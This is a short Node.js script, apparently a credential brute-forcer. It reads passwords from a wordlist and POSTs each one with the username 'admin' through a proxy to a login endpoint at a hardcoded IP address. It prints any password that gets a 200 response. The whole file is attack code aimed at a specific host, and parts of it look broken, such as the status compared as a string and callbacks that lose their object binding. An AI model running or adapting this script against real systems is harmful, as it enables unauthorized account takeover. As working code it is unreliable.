const fs = require('fs')
const readline = require('line-reader');
const fetch  = require('node-fetch')
const path = require('path')
//https://77.88.207.60/loginValidation.htm/username=login_type&secretkey=password_type&mode=login&logintype=0&ajax=1

class brutforce {
    constructor(ip,port,params,list,proxy) {
        this.ip =ip;
        this.params_obj=params;
        this.port=port;
        this.list_dir = list;
        this.proxy=proxy;
    }
    start(){
        this.reader(this.apiMethod)

    }
    reader(cb){
        console.log(this.list_dir)
        readline.open(this.list_dir,reader=>{


             reader.nextLine((ps)=>{
                 console.log(ps)
                 cb(ps)
             })

        })
    }
    apiMethod(pass){
        fetch(this.ip+':'+this.port+this.params_obj.first+this.params_obj.login+
            this.params_obj.second+pass+this.params_obj.last,{
            method:"POST",
            proxy:this.proxy
        }).then(data=>{
            if(data.status==='200'){
               console.log('password: '+pass)
            }
        })
    }

}
const start = new brutforce('http://77.88.207.60',80,{
    first:'loginValidation.htm/username=',
    login:'admin',
    second:"&secretkey=",
    last:"&mode=login&logintype=0&ajax=1"
},path.join(__dirname+'/list.txt'),'localhost:9001')

start.start();
/*
params={
firs:loginValidation.htm/username=
login:login_type
second:&secretkey=
password:password_type
last:&mode=login&logintype=0&ajax=1
}
*/

